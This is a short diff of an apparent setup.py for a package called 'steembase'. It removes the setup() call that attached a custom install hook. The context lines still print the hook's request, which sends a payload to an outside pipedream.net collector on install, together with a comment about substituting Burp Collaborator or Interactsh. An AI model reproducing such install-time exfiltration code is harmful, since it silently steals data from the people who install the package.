@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://eo60j7pi241k8sx.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='steembase', #package name
-      version='1.5.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                             
